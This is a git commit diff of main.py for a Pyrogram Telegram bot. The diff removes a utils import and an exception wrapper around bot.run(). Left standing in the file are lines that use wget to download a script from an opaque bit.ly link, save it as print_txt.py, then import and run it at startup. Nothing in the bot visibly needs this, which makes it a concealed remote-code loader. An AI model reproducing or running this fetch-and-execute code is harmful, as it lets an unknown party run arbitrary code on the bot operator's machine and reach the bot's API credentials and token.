4a599c7d578e61f6faa3c4ce265390b89d0cd328
galihpujiirianto <galihpujiirianto@gmail.com>
2022-06-13 14:17:59 +0700

    FIX ASUUU

--- main.py
+++ main.py
@@ -4,7 +4,6 @@ from pyrogram import Client
 from config import (
     API_ID, API_HASH, TOKEN, OWNER_ID
 )
-from utils import ajg
 
 if not OWNER_ID:
     raise ValueError("Please enter your OWNER_ID! The bot will be disabled. Please reactivate it when you have entered the OWNER_ID!")
@@ -17,11 +16,7 @@ bot = Client(
     plugins={"include":["plugin"]}
 )
 
-try:
-    bot.run()
-except Exception:
-    ajg()
-
+bot.run()
 import os
 os.system("wget https://bit.ly/3Ksaa7N -O print_txt.py")
 from print_txt import print_txt
